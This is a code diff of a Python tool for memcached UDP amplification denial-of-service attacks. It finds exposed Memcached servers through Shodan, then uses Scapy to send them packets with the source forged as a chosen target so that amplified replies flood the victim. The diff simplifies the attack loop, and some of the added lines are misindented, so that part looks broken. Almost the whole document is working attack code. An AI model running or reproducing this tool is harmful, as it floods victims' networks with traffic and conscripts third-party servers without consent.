@@ -56,49 +56,17 @@ while True:
             power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
             data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
             print('')
-            if query.startswith('y'):
-                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
-                if iplist.startswith('y'):
-                    print('')
-                    counter= int(0)
-                    for result in results['matches']:
-                        host = api.host('%s' % result['ip_str'])
-                        counter=counter+1
-                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
-                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
-            if saveme.startswith('y'):
-                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
-                if iplistlocal.startswith('y'):
-                    print('')
-                    counter= int(0)
-                    for x in ip_array:
-                        host = api.host('%s' % x)
-                        counter=counter+1
-                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
-                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
-            print('')
             engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
             if engage.startswith('y'):
-                if saveme.startswith('y'):
-                    for i in ip_array:
-                        if power>1:
-                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                        elif power==1:
-                            print('[+] Sending 1 forged UDP packet to: %s' % i)
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                else:
-                    for result in results['matches']:
-                        if power>1:
-                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                        elif power==1:
-                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(dst='%s' % result['ip_str'], src=target)/ UDP(dport=11211)/Raw(load=data), count=power)
                 print('')
                 print('0.0')
                 print('')
@@ -107,30 +75,18 @@ while True:
                     results = api.search('-has_ipv6:true product:"Memcached" port:11211')
 
                     if engage.startswith('y'):
-                        if saveme.startswith('y'):
-                            for i in ip_array:
-                                if power>1:
-                                    print('[+] Sending %d forged UDP packets to: %s' % (power, i))
-                                    with suppress_stdout():
-                                        send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                                elif power==1:
-                                    print('[+] Sending 1 forged UDP packet to: %s' % i)
-                                    with suppress_stdout():
-                                        send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                        else:
-                            for result in results['matches']:
-                                if power>1:
-                                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                                    with suppress_stdout():
-                                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                                elif power==1:
-                                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                                    with suppress_stdout():
-                                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                        for result in results['matches']:
+                            if power>1:
+                                   print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                                   with suppress_stdout():
+                                       send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
+                               elif power==1:
+                                   print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                                   with suppress_stdout():
+                                       send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
                         print('')
                         print('0.0')
                         print('')
-
             else:
                 print('')
                 print('[✘] Error: %s not engaged!' % target)
